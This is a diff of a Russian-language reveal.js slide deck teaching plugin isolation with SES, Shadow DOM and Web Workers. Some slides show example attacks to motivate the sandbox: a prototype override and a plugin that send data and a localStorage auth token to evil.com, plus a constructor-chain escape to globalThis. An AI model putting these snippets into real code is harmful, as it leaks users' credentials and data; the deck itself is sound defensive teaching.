-            🔗 <a href="https://github.com/endojs/endo">github.com/endojs/endo</a><br>
-            📚 <a href="https://ses.js.org">ses.js.org</a><br>
-            📖 <a href="https://github.com/tc39/proposal-ses">TC39 SES Proposal</a>
-          </small>
-        </p>
-        <br>
-        <p style="font-size: 0.8em;">
-          <em>"Безопасность — это не продукт, а процесс"</em><br>
-          — Bruce Schneier
-        </p>
-      </section>
+// Заморозить все встроенные объекты
+lockdown();
 
-    </div>
-  </div>
+// Создать изолированную среду
+const compartment = new Compartment({
+  console: console, // Явно разрешаем
+  // fetch НЕ передаём - плагин не сможет делать запросы
+});
 
-  <script src="dist/reveal.js"></script>
-  <script src="plugin/notes/notes.js"></script>
-  <script src="plugin/markdown/markdown.js"></script>
-  <script src="plugin/highlight/highlight.js"></script>
-  <script>
-    // More info about initialization & config:
-    // - https://revealjs.com/initialization/
-    // - https://revealjs.com/config/
-    Reveal.initialize({
-      hash: true,
+// Запустить код плагина
+compartment.evaluate(pluginCode);
+                    </code></pre>
+                </section>
 
-      // Learn about plugins: https://revealjs.com/plugins/
-      plugins: [RevealMarkdown, RevealHighlight, RevealNotes]
+                <section>
+                    <h3>Принцип минимальных привилегий</h3>
+                    <p>🔑 <strong>Аналогия:</strong> пропуск в офис</p>
+                    <br>
+                    <ul>
+                        <li>Открывает только нужные двери</li>
+                        <li>Не даёт доступ ко всему зданию</li>
+                    </ul>
+                    <br><br>
+                    <p><em>Плагин получает только то, что явно разрешено</em></p>
+                </section>
+
+                <section>
+                    <h3>Что недоступно в SES</h3>
+                    <pre><code class="javascript" data-trim>
+// По умолчанию плагин НЕ может:
+fetch()           // ❌ Делать HTTP-запросы
+localStorage      // ❌ Читать хранилище
+document          // ❌ Менять DOM
+window.location   // ❌ Изменять URL
+XMLHttpRequest    // ❌ Старые запросы
+WebSocket         // ❌ Открывать сокеты
+
+// Может только то, что мы явно передали ✅
+                    </code></pre>
+                </section>
+            </section>
+            <section>
+                <section>
+                    <h2>Как работает SES изнутри?</h2>
+                    <h3>Пошаговая реализация с нуля</h3>
+                </section>
+
+                <section>
+                    <h3>Три кита SES</h3>
+                    <div class="mermaid">
+                        <pre>
+%%{init: {'theme':'neutral'}}%%
+graph TD
+    A[SES] --> B[Lockdown Заморозка&nbsp;встроенных&nbsp;объектов]
+    A --> C[Compartment Изолированная&nbsp;среда&nbsp;выполнения]
+    A --> D[Harden Глубокая&nbsp;заморозка&nbsp;объектов]
+    style A fill:#2c3e50,stroke:#34495e,color:#fff
+    style B fill:#3498db,stroke:#2980b9,color:#fff
+    style C fill:#9b59b6,stroke:#8e44ad,color:#fff
+    style D fill:#e74c3c,stroke:#c0392b,color:#fff
+                        </pre>
+                    </div>
+                </section>
+
+                <!-- Шаг 1: Intrinsics -->
+                <section>
+                    <h3>Шаг 1: Что такое intrinsics?</h3>
+                    <p><strong>Intrinsics</strong> — встроенные объекты JavaScript</p>
+                    <pre><code class="javascript" data-trim data-line-numbers>
+// Примеры intrinsics
+Array
+Object
+Function
+Date
+Math
+Promise
+String
+Number
+// ... и их прототипы
+Array.prototype
+Object.prototype
+// ... всего ~200 объектов
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Проблема: можно изменить</h3>
+                    <pre><code class="javascript" data-trim data-line-numbers>
+// Вредоносный код может изменить intrinsics
+Array.prototype.push = function() {
+  // Отправить данные хакеру
+  fetch('https://evil.com/steal', { 
+    method: 'POST',
+    body: JSON.stringify(this) 
+  });
+  // Продолжить нормально
+  return Array.prototype.push.call(this, ...arguments);
+};
+
+// Теперь ВСЕ массивы в приложении скомпрометированы
+const items = [1, 2, 3];
+items.push(4); // Данные утекли! 😱
+                    </code></pre>
+                </section>
+
+                <!-- Шаг 2: Lockdown -->
+                <section>
+                    <h3>Шаг 2: Реализуем Lockdown</h3>
+                    <p>Цель: заморозить все intrinsics</p>
+                </section>
+
+                <section>
+                    <h3>Шаг 2.1: Найти все intrinsics</h3>
+                    <pre style="font-size: 0.5em;"><code class="javascript" data-trim data-line-numbers="1-35|5-9|15-31|33|34">
+// Упрощённая версия
+function getAllIntrinsics() {
+  const intrinsics = new Set();
+  
+  // Стартовые объекты
+  const roots = [
+    Object, Array, Function, String, Number,
+    Boolean, Date, RegExp, Error, Promise,
+    Map, Set, WeakMap, WeakSet, JSON, Math
+  ];
+  
+  // Обход графа объектов
+  const visited = new WeakSet();
+  
+  function visit(obj) {
+    if (!obj || visited.has(obj)) return;
+    visited.add(obj);
+    intrinsics.add(obj);
+    
+    // Добавить прототип
+    const proto = Object.getPrototypeOf(obj);
+    if (proto) visit(proto);
+    
+    // Добавить свойства
+    Object.getOwnPropertyNames(obj).forEach(key =&gt; {
+      const value = obj[key];
+      if (typeof value === 'object' || typeof value === 'function') {
+        visit(value);
+      }
     });
-  </script>
+  }
+  
+  roots.forEach(visit);
+  return intrinsics;
+}
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Шаг 2.2: Заморозить intrinsics</h3>
+                    <pre><code class="javascript" data-trim>
+// Упрощённая версия lockdown
+function lockdown() {
+  const intrinsics = getAllIntrinsics();
+  
+  // Заморозить каждый intrinsic
+  intrinsics.forEach(obj =&gt; {
+    Object.freeze(obj);
+  });
+  
+  console.log('✅ Все intrinsics заморожены!');
+}
+
+// Использование
+lockdown();
+
+// Теперь нельзя изменить
+Array.prototype.push = function() {}; // ❌ Ошибка!
+Object.freeze = function() {}; // ❌ Ошибка!
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Проблема: constructor и __proto__</h3>
+                    <pre><code class="javascript" data-trim>
+// Даже после freeze можно "подняться" по цепочке
+const arr = [];
+arr.constructor // Array
+  .prototype    // Array.prototype
+  .constructor  // Array
+  .constructor  // Function 😱
+  ('return this')() // globalThis!
+
+// Атакующий может получить доступ к Function
+// и выполнить произвольный код
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Шаг 2.3: Заменить constructor</h3>
+                    <pre style="font-size: 0.5em;"><code class="javascript" data-trim data-line-numbers="1-22|2,4,17|7-13|16|20-22">
+function lockdown() {
+  const intrinsics = getAllIntrinsics();
+  
+  intrinsics.forEach(obj =&gt; {
+    // Заменить .constructor на frozen dummy
+    if (obj.constructor) {
+      Object.defineProperty(obj, 'constructor', {
+        value: Object.freeze(function() {
+          throw new TypeError('Запрещено');
+        }),
+        writable: false,
+        configurable: false
+      });
+    }
+    
+    Object.freeze(obj);
+  });
+}
+
+// Теперь безопасно
+const arr = [];
+arr.constructor.constructor('alert(1)'); // ❌ TypeError!
+                    </code></pre>
+                </section>
+
+                <!-- Шаг 3: Compartment -->
+                <section>
+                    <h3>Шаг 3: Реализуем Compartment</h3>
+                    <p>Цель: создать изолированную среду выполнения</p>
+                </section>
+
+                <section>
+                    <h3>Что нужно для изоляции?</h3>
+                    <ul>
+                        <li>✅ Свой globalThis (но не window)</li>
+                        <li>✅ Свой eval (ограниченный)</li>
+                        <li>✅ Общие intrinsics (Array, Object)</li>
+                        <li>❌ Нет fetch, localStorage, document</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Шаг 3.1: Создаём globalThis</h3>
+                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim data-line-numbers="1-20|22-25">
+class Compartment {
+  constructor(endowments = {}) {
+    // Создаём пустой объект с теми же intrinsics
+    this.globalThis = Object.create(null);
+    
+    // Добавляем только разрешённые API
+    Object.assign(this.globalThis, {
+      // Безопасные intrinsics
+      Array,
+      Object,
+      String,
+      Number,
+      Math,
+      JSON,
+      
+      // API, которые явно передали
+      ...endowments
+    });
+  }
+}
+
+// Использование
+const c = new Compartment({
+  console: console // Явно разрешаем
+});
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Шаг 3.2: Проблема с eval</h3>
+                    <pre><code class="javascript" data-trim>
+// Наивная попытка
+class Compartment {
+  evaluate(code) {
+    // ❌ Так не работает!
+    // eval выполнится в текущем scope
+    return eval(code);
+  }
+}
+
+const c = new Compartment();
+c.evaluate('fetch("evil.com")'); 
+// Получит доступ к настоящему fetch! 😱
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Шаг 3.3: "Магия with + Proxy"</h3>
+                    <p>Секретный соус SES</p>
+                    <pre style="font-size: 0.35em;"><code class="javascript" data-trim data-line-numbers="1-30|2-7|9-29|10-17|21-28">
+class Compartment {
+  constructor(endowments = {}) {
+    this.globalThis = { ...endowments };
+    
+    // Создаём evaluator (упрощённо)
+    this.evaluate = this.createEvaluator();
+  }
+  
+  createEvaluator() {
+    // Proxy перехватывает доступ к переменным
+    const scopeProxy = new Proxy(this.globalThis, {
+      has: () =&gt; true,  // Все переменные "существуют"
+      get: (target, key) =&gt; {
+        if (key === Symbol.unscopables) return undefined;
+        return target[key]; // Берём из нашего globalThis
+      }
+    });
+    
+    // with создаёт новый scope
+    // eval выполнится в этом scope
+    return Function('scopeProxy', `
+      with (scopeProxy) {
+        return function(code) {
+          "use strict";
+          return eval(code);
+        }
+      }
+    `)(scopeProxy);
+  }
+}
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Как работает with + Proxy</h3>
+                    <pre><code class="javascript" data-trim>
+// 1. with создаёт новый scope
+with (scopeProxy) {
+  // 2. При поиске переменной fetch
+  fetch; 
+  // JavaScript спрашивает scopeProxy.has('fetch')
+  // Proxy отвечает: true
+  // JavaScript пытается получить scopeProxy.get('fetch')
+  // Proxy возвращает: undefined (т.к. не передали)
+}
+
+// Результат: fetch === undefined ✅
+// Не можем получить настоящий fetch!
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Диаграмма работы with + Proxy</h3>
+                    <div class="mermaid">
+                        <pre>
+%%{init: {'theme':'neutral'}}%%
+sequenceDiagram
+    participant P as Плагин
+    participant W as with statement
+    participant Px as Proxy
+    participant G as globalThis
+    
+    P->>W: fetch('evil.com')
+    W->>Px: has('fetch')?
+    Px-->>W: true (чтобы не было ReferenceError)
+    W->>Px: get('fetch')
+    Px->>G: globalThis['fetch']
+    G-->>Px: undefined (не передали)
+    Px-->>W: undefined
+    W-->>P: TypeError: fetch is not a function ✅
+                        </pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Полная реализация Compartment</h3>
+                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim  data-line-numbers="1-31|3-7|9-15|17-24|29-31">
+class Compartment {
+  constructor(endowments = {}) {
+    this.globalThis = {
+      // Безопасные intrinsics
+      Array, Object, String, Number, Math, JSON,
+      ...endowments
+    };
+    
+    const scopeProxy = new Proxy(this.globalThis, {
+      has: () => true,
+      get: (target, key) => {
+        if (key === Symbol.unscopables) return undefined;
+        return target[key];
+      }
+    });
+    
+    this.evaluate = Function('proxy', `
+      with (proxy) {
+        return function(code) {
+          "use strict";
+          return eval(code);
+        }
+      }
+    `)(scopeProxy);
+  }
+}
+
+// Готово! 🎉
+const c = new Compartment({ console });
+c.evaluate('console.log("Hello from compartment!")');
+c.evaluate('fetch("evil.com")'); // ❌ TypeError
+                    </code></pre>
+                </section>
+
+                <!-- Шаг 4: Harden -->
+                <section>
+                    <h3>Шаг 4: Реализуем harden()</h3>
+                    <p>Цель: глубоко заморозить объект</p>
+                </section>
+
+                <section>
+                    <h3>Object.freeze vs harden</h3>
+                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim>
+const obj = {
+  name: 'Alice',
+  settings: {
+    theme: 'dark'
+  }
+};
+
+// Object.freeze — поверхностная заморозка
+Object.freeze(obj);
+obj.name = 'Bob';              // ❌ Не сработает
+obj.settings.theme = 'light';  // ✅ Сработает! 😱
+
+// harden — глубокая заморозка
+harden(obj);
+obj.name = 'Bob';              // ❌ Не сработает
+obj.settings.theme = 'light';  // ❌ Не сработает ✅
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Реализация harden</h3>
+                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim data-line-numbers="1-33|10-11|13-21|23-27|2-8">
+function harden(obj) {
+  // Отслеживаем посещённые объекты
+  const visited = new WeakSet();
+  
+  function deepFreeze(target) {
+    // Уже заморозили
+    if (visited.has(target)) return target;
+    visited.add(target);
+    
+    // Заморозить сам объект
+    Object.freeze(target);
+    
+    // Рекурсивно заморозить свойства
+    Object.getOwnPropertyNames(target).forEach(key => {
+      const value = target[key];
+      
+      // Если свойство — объект, заморозить его тоже
+      if (value && typeof value === 'object') {
+        deepFreeze(value);
+      }
+    });
+    
+    // Заморозить прототип
+    const proto = Object.getPrototypeOf(target);
+    if (proto && proto !== Object.prototype) {
+      deepFreeze(proto);
+    }
+    
+    return target;
+  }
+  
+  return deepFreeze(obj);
+}
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Использование harden</h3>
+                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim>
+const api = {
+  getData: () => [1, 2, 3],
+  config: {
+    timeout: 5000,
+    retries: 3
+  }
+};
+
+// Делаем API неизменяемым перед передачей плагину
+harden(api);
+
+// Теперь плагин не может изменить API
+api.getData = () => []; // ❌ Ошибка
+api.config.timeout = 0; // ❌ Ошибка
+
+// API безопасен для передачи ненадёжному коду
+const c = new Compartment({ api: api });
+c.evaluate('api.getData()'); // [1, 2, 3]
+                    </code></pre>
+                </section>
+
+                <!-- Собираем всё вместе -->
+                <section>
+                    <h3>Собираем всё вместе</h3>
+                    <pre style="font-size: 0.6em;"><code class="javascript" data-trim data-line-numbers="1-27|1-2|4-8|10-11|13-16|18-23|25-27">
+// Шаг 1: Заморозить intrinsics
+lockdown();
+
+// Шаг 2: Создать API для плагина
+const pluginAPI = {
+  notify: (msg) => console.log('[Plugin]', msg),
+  getData: () => ({ user: 'Alice' })
+};
+
+// Шаг 3: Заморозить API
+harden(pluginAPI);
+
+// Шаг 4: Создать Compartment
+const compartment = new Compartment({
+  api: pluginAPI
+});
+
+// Шаг 5: Запустить плагин
+const pluginCode = `
+  api.notify('Hello from plugin!');
+  const data = api.getData();
+  api.notify('Got data: ' + data.user);
+`;
+
+compartment.evaluate(pluginCode);
+// [Plugin] Hello from plugin!
+// [Plugin] Got data: Alice
+                    </code></pre>
+                </section>
+
+                 <section>
+                    <h3>Итоговая архитектура</h3>
+                    <div class="mermaid">
+%%{init: {'theme':'neutral'}}%%
+graph TB
+    subgraph App[Основное приложение]
+        L[lockdown<br/>Intrinsics заморожены]
+        API[harden pluginAPI<br/>API заморожен]
+        
+        subgraph Comp[Compartment]
+            GT[globalThis пустой]
+            PR[Proxy перехват]
+            EV[eval безопасный]
+            
+            subgraph Plugin[Код плагина]
+                OK1[api.notify разрешен]
+                NO1[fetch запрещен]
+                NO2[localStorage запрещен]
+            end
+        end
+    end
+    
+    L --> API
+    API --> Comp
+    GT --> PR
+    PR --> EV
+    EV --> Plugin
+    
+    style App fill:#ecf0f1,stroke:#95a5a6
+    style L fill:#3498db,stroke:#2980b9,color:#fff
+    style API fill:#9b59b6,stroke:#8e44ad,color:#fff
+    style Comp fill:#e8f4f8,stroke:#3498db
+    style Plugin fill:#fef5e7,stroke:#f39c12
+    style OK1 fill:#2ecc71,stroke:#27ae60,color:#fff
+    style NO1 fill:#e74c3c,stroke:#c0392b,color:#fff
+    style NO2 fill:#e74c3c,stroke:#c0392b,color:#fff
+                    </div>
+                </section>
+
+
+                <section>
+                    <h3>Настоящий SES сложнее</h3>
+                    <p>Наша реализация — упрощённая версия для понимания</p>
+                    <br>
+                    <p><strong>Реальный SES также:</strong></p>
+                    <ul style="font-size: 0.85em;">
+                        <li>Обрабатывает ~200 intrinsics, а не 6</li>
+                        <li>Поддерживает import/export модулей</li>
+                        <li>Защищает от атак через Symbol.unscopables</li>
+                        <li>Предотвращает re-entrancy атаки</li>
+                        <li>Оптимизирует производительность Proxy</li>
+                        <li>Совместим со всеми браузерами</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Ключевые выводы</h3>
+                    <ol style="font-size: 0.6em;">
+                        <li><strong>Lockdown</strong> замораживает intrinsics → нельзя испортить встроенные объекты</li>
+                        <li><strong>Compartment</strong> использует with + Proxy → изоляция переменных</li>
+                        <li><strong>Harden</strong> глубоко замораживает → API безопасен для передачи</li>
+                    </ol>
+                    <br><br>
+                    <p style="font-size: 0.8em;"><em>Вместе = безопасное выполнение ненадёжного кода ✅</em></p>
+                </section>
+            </section>
+
+            <section>
+                <section>
+                    <h2>Плагины без UI</h2>
+                    <h3>SES + Web Workers</h3>
+                </section>
+
+                <section>
+                    <h3>Зачем плагины без UI?</h3>
+                    <ul>
+                        <li>⚙️ Тяжёлые вычисления (обработка данных)</li>
+                        <li>🔄 Фоновая обработка (парсинг, валидация)</li>
+                        <li>🧮 Математические операции</li>
+                        <li>📊 Анализ и трансформация данных</li>
+                        <li>🚀 Не блокируют главный поток</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Архитектура: Main Thread + Worker</h3>
+                    <div class="mermaid">
+%%{init: {'theme':'neutral'}}%%
+graph TB
+    subgraph Main[Main Thread]
+        App[React App]
+        API[Plugin API]
+    end
+    
+    subgraph Worker[Web Worker]
+        subgraph SES[SES Compartment]
+            Plugin[Plugin Code]
+        end
+    end
+    
+    App --&gt;|postMessage| Worker
+    Worker --&gt;|postMessage| App
+    API --&gt;|Контролирует| Worker
+    SES --&gt;|Изолирует| Plugin
+    
+    style Main fill:#ecf0f1,stroke:#95a5a6
+    style Worker fill:#e8f4f8,stroke:#3498db
+    style SES fill:#fef5e7,stroke:#f39c12
+    style Plugin fill:#d5f4e6,stroke:#27ae60
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Worker Thread vs Main Thread</h3>
+                    <table style="font-size: 0.8em;">
+                        <thead>
+                            <tr>
+                                <th>Характеристика</th>
+                                <th>Main Thread</th>
+                                <th>Worker Thread</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Доступ к DOM</td>
+                                <td>✅ Есть</td>
+                                <td>❌ Нет</td>
+                            </tr>
+                            <tr>
+                                <td>Блокирует UI</td>
+                                <td>⚠️ Да</td>
+                                <td>✅ Нет</td>
+                            </tr>
+                            <tr>
+                                <td>Вычисления</td>
+                                <td>⚠️ Медленно</td>
+                                <td>✅ Быстро</td>
+                            </tr>
+                            <tr>
+                                <td>SES изоляция</td>
+                                <td>✅ Да</td>
+                                <td>✅ Да</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </section>
+                <section>
+                    <h3>Поток выполнения</h3>
+                    <div class="mermaid">
+%%{init: {'theme':'neutral'}}%%
+sequenceDiagram
+    participant User as Пользователь
+    participant App as React App
+    participant Hook as useWorkerPlugin
+    participant Worker as Web Worker
+    participant SES as SES Compartment
+    participant Plugin as Plugin
+    
+    User-&gt;&gt;App: Click "Process"
+    App-&gt;&gt;Hook: execute('calculateStats', data)
+    Hook-&gt;&gt;Worker: postMessage({type: 'EXECUTE'})
+    Worker-&gt;&gt;SES: compartment.evaluate()
+    SES-&gt;&gt;Plugin: calculateStats(data)
+    Plugin-&gt;&gt;Plugin: Вычисления (не блокирует UI)
+    Plugin--&gt;&gt;SES: result
+    SES--&gt;&gt;Worker: result
+    Worker--&gt;&gt;Hook: postMessage({type: 'RESULT'})
+    Hook--&gt;&gt;App: onResult(data)
+    App--&gt;&gt;User: Показать результат
+                    </div>
+                </section>
+
+
+                <!-- Безопасность в Worker -->
+                <section>
+                    <h3>Безопасность в Worker</h3>
+
+<ul>
+  <li>❌ Получить доступ к DOM <small style="vertical-align: middle;">(нет document)</small></li>
+  <li>❌ Получить доступ к window</li>
+  <li>❌ Изменить UI напрямую</li>
+  <li>❌ Получить доступ к localStorage <small style="vertical-align: middle;">(если не передали)</small></li>
+  <li>❌ Сделать fetch <small style="vertical-align: middle;">(если не передали)</small></li>
+</ul>
+ 
+ 
+
+ 
+ 
+
+                </section>
+
+                <!-- Передача больших данных -->
+                <section>
+                    <h5>Оптимизация: Transferable Objects</h5>
+                    <pre style="font-size: 0.35em;"><code class="javascript" data-trim data-line-numbers="1-32|1-2|4-25">
+// Проблема: postMessage копирует данные (медленно)
+// Решение: Transferable Objects (передача владения)
+
+function executeWithTransfer(method, data) {
+  // Создаём ArrayBuffer для больших данных
+  const buffer = new ArrayBuffer(data.length * 8);
+  const view = new Float64Array(buffer);
+  
+  // Заполняем данные
+  for (let i = 0; i &lt; data.length; i++) {
+    view[i] = data[i];
+  }
+  
+  // Передаём ownership в Worker (zero-copy!)
+  workerRef.current.postMessage({
+    type: 'EXECUTE',
+    payload: {
+      method,
+      buffer: buffer
+    }
+  }, [buffer]); // &lt;-- Передача владения
+  
+  // buffer теперь недоступен в main thread
+  console.log(buffer.byteLength); // 0
+}
+
+// В Worker:
+worker.onmessage = (event) =&gt; {
+  const { buffer } = event.data.payload;
+  const data = new Float64Array(buffer);
+  // Работаем с данными без копирования ✅
+};
+                    </code></pre>
+                </section>
+
+                <!-- Примеры использования -->
+                <section>
+                    <h3>Когда использовать Worker Plugins</h3>
+                    <table style="font-size: 0.75em;">
+                        <thead>
+                            <tr>
+                                <th>Задача</th>
+                                <th>Подход</th>
+                                <th>Причина</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Рендеринг UI</td>
+                                <td>Main Thread + Shadow DOM</td>
+                                <td>Нужен доступ к DOM</td>
+                            </tr>
+                            <tr>
+                                <td>Обработка данных</td>
+                                <td>Worker + SES</td>
+                                <td>Не блокирует UI</td>
+                            </tr>
+                            <tr>
+                                <td>Парсинг JSON/XML</td>
+                                <td>Worker + SES</td>
+                                <td>Тяжёлые вычисления</td>
+                            </tr>
+                            <tr>
+                                <td>Анализ текста</td>
+                                <td>Worker + SES</td>
+                                <td>CPU-intensive</td>
+                            </tr>
+                            <tr>
+                                <td>Валидация форм</td>
+                                <td>Main Thread</td>
+                                <td>Быстрая операция</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </section>
+
+                <!-- Debugging -->
+
+                <!-- Ключевые выводы -->
+                <section>
+                    <h3>Ключевые выводы</h3>
+                    <ol style="font-size: 0.8em;">
+                        <li>Worker Threads для CPU-intensive задач</li>
+                        <li>SES изолирует код плагина в Worker</li>
+                        <li>postMessage для коммуникации</li>
+                        <li>Transferable Objects для больших данных</li>
+                        <li>Двойная изоляция: Worker + SES</li>
+                        <li>Не блокирует UI — лучший UX</li>
+                    </ol>
+                </section>
+            </section>
+            
+            <!-- Две главные проблемы -->
+            <section>
+                <section>
+                    <h2>Две главные проблемы</h2>
+                </section>
+
+                <section>
+                    <h3>Проблема 1: Конфликты стилей и DOM</h3>
+                    <pre><code class="css" data-trim>
+/* Плагин A */
+.button { background: red; }
+
+/* Плагин B */
+.button { background: blue; }
+
+/* Кто победит? 🤔 */
+                    </code></pre>
+                    <p>Стили одного плагина "ломают" другой</p>
+                </section>
+
+                <section>
+                    <h3>Пример конфликта DOM</h3>
+                    <pre><code class="javascript" data-trim>
+// Плагин случайно удаляет элемент другого плагина
+document.querySelector('.widget').remove();
+
+// Или меняет содержимое
+document.body.innerHTML = 'Упс! 💥';
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Проблема 2: Вредоносный код</h3>
+                    <pre><code class="javascript" data-trim>
+// Плагин крадёт токены
+const token = localStorage.getItem('auth_token');
+fetch('https://evil.com/steal?token=' + token);
+
+// Или ломает прототипы
+Array.prototype.push = function() {
+  console.log('Хакнуто! 😈');
+};
+                    </code></pre>
+                </section>
+            </section>
+
+            <!-- Решение 1: Shadow DOM -->
+            <section>
+                <section>
+                    <h2>Плагины c UI</h2>
+                    <h3>SES + Shadow DOM</h3>
+                </section>
+                <section>
+                    <h2>Shadow DOM</h2>
+                    <p>Изоляция стилей и DOM</p>
+                </section>
+
+                <section>
+                    <h3>Что такое Shadow DOM?</h3>
+                    <p><strong>&laquo;Невидимая коробка&raquo;</strong> для HTML и CSS</p>
+                    <br>
+                    <p>🏠 Аналогия: комната с односторонним зеркалом</p>
+                    <ul>
+                        <li>Изнутри всё видно</li>
+                        <li>Снаружи ничего не видно</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Проблема без Shadow DOM</h3>
+                    <pre><code class="html" data-trim>
+<!-- Глобальные стили -->
+<style>
+  .widget { background: red; }
+</style>
+
+<!-- Плагин хочет свой цвет -->
+<div class="widget">
+  Я буду красным, а не синим! 😢
+</div>
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Решение с Shadow DOM</h3>
+                    <pre><code class="javascript" data-trim>
+// Создаём Shadow DOM
+const host = document.getElementById('plugin-host');
+const shadowRoot = host.attachShadow({ mode: 'closed' });
+
+// Стили изолированы!
+shadowRoot.innerHTML = `
+  <style>
+    .widget { background: blue; }
+  </style>
+  <div class="widget">
+    Я синий, и никто не помешает! 🎉
+  </div>
+`;
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Как работает изоляция</h3>
+                    <div class="mermaid">
+                        <pre>
+%%{init: {'theme':'neutral'}}%%
+flowchart LR
+    A[Основное приложение<br/>Global CSS] 
+    B[Shadow DOM<br/>Изолированные стили]
+    A -.Стили не проникают.-> B
+    B -.Стили не утекают.-> A
+    style A fill:#3498db,stroke:#2980b9,color:#fff
+    style B fill:#e74c3c,stroke:#c0392b,color:#fff
+                        </pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Когда использовать</h3>
+                    <ul style="font-size: 0.7em;">
+                        <li>💬 Виджеты для чужих сайтов (чат-боты, формы)</li>
+                        <li>🎨 UI-компоненты библиотек</li>
+                        <li>🔌 Плагины с независимыми стилями</li>
+                        <li>📦 Встраиваемые элементы</li>
+                    </ul>
+                </section>
+                <section>
+                    <h3>Пример</h3>
+                    <pre style="font-size: 0.5em;"><code class="javascript" data-trim>
+import 'ses';
+lockdown();
+
+// 1. Создаём Shadow DOM для изоляции стилей
+const host = document.getElementById('plugin-host');
+const shadowRoot = host.attachShadow({ mode: 'closed' });
+
+// 2. Создаём SES-компартмент для изоляции кода
+const compartment = new Compartment({
+  render: (html) => shadowRoot.innerHTML = html,
+  notify: (msg) => console.log(msg)
+});
+
+// 3. Запускаем плагин
+compartment.evaluate(pluginCode);
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Поддержка браузеров</h3>
+                    <div style="font-size: 0.9em;">
+                        <p><strong>Shadow DOM:</strong></p>
+                        <p>✅ Chrome 53+, Firefox 63+, Safari 10+, Edge 79+</p>
+                        <br>
+                        <p><strong>SES:</strong></p>
+                        <p>✅ Работает через библиотеку во всех современных браузерах</p>
+                    </div>
+                </section>
+                <section>
+                    <h2>Где использовать?</h2>
+                </section>
+
+                <section>
+                    <h3>Идеальные сценарии</h3>
+                    <ul>
+                        <li>🔌 Системы расширений (VSCode, Chrome)</li>
+                        <li>🛒 Маркетплейсы с плагинами</li>
+                        <li>📊 Встраиваемые виджеты</li>
+                        <li>☁️ Мультитенантные SaaS</li>
+                        <li>🎮 Игровые моды и дополнения</li>
+                    </ul>
+                </section>
+                <section>
+                    <h2>Демонстрация на React</h2>
+                    <p>github.com/zolotyh/ses-shadow-demo</p>
+                </section>
+
+            </section>
+
+
+            <!-- Заключение -->
+            <section>
+                <section>
+                    <h2>Ключевые выводы</h2>
+                </section>
+
+                <section>
+                    <h3>Изоляция, UI, Performance</h3>
+                    <ol>
+                        <li><strong>Shadow DOM</strong> — изоляция стилей и DOM</li>
+                        <li><strong>SES</strong> — изоляция выполнения кода</li>
+                        <li><strong>WebWorkers</strong> — для ускорения</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Преимущества подхода</h3>
+                    <ul>
+                        <li>🚀 Легковеснее, чем iframe</li>
+                        <li>🛡️ Безопаснее, чем обычный JavaScript</li>
+                        <li>🎨 Нет конфликтов стилей</li>
+                        <li>⚡ Хорошая производительность</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Следующие шаги</h3>
+                    <ol style="font-size: 0.8em;">
+                        <li>📖 Изучить документацию SES и Shadow DOM</li>
+                        <li>💻 Попробовать демо-проект</li>
+                        <li>🏗️ Спроектировать API плагинов</li>
+                        <li>🚀 Применить в своих проектах</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Полезные ресурсы</h3>
+                    <ul style="font-size: 0.8em;">
+                        <li>github.com/tc39/proposal-ses</li>
+                        <li>developer.mozilla.org/docs/Web/API/Web_components/Using_shadow_DOM</li>
+                        <li>github.com/zolotyh/ses-shadow-demo</li>
+                        <li>agoric.com/blog</li>
+                    </ul>
+                </section>
+            </section>
+
+            <!-- Финальный слайд -->
+            <section>
+                <h1>Спасибо!</h1>
+                <h3>Вопросы?</h3>
+                <br>
+                <p>github.com/zolotyh/ses-shadow-demo</p>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="dist/reveal.js"></script>
+    <script src="plugin/notes/notes.js"></script>
+    <script src="plugin/markdown/markdown.js"></script>
+    <script src="plugin/highlight/highlight.js"></script>
+    <script src="plugin/mermaid/mermaid.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            slideNumber: true,
+            transition: 'slide',
+            plugins: [ RevealMarkdown, RevealHighlight, RevealNotes, RevealMermaid ]
+        });
+    </script>
 </body>
 
 </html>
